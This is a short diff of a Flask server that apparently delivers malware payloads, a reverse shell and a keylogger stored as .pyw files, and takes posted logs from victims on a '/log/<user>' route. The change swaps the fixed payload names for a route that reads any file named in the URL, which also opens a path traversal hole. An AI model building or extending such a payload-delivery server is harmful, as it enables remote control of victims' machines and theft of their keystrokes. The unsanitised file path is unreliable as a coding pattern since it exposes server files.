@@ -3,13 +3,8 @@ app = Flask(__name__)
 
 @app.route('/<payload>', methods = ['GET'])
 def get_payloads(payload):
-    if payload == "rshell":
-        with open('payloads/victim_reverse_shell.pyw', 'r') as f:
-            return f.read()
-
-    elif payload == "keylog":
-        with open('payloads/key_logger.pyw', 'r') as f:
-            return f.read()
+    with open(f'payloads/{payload}.pyw', 'r') as f:
+        return f.read()
 
 
 @app.route('/log/<user>', methods = ['POST'])
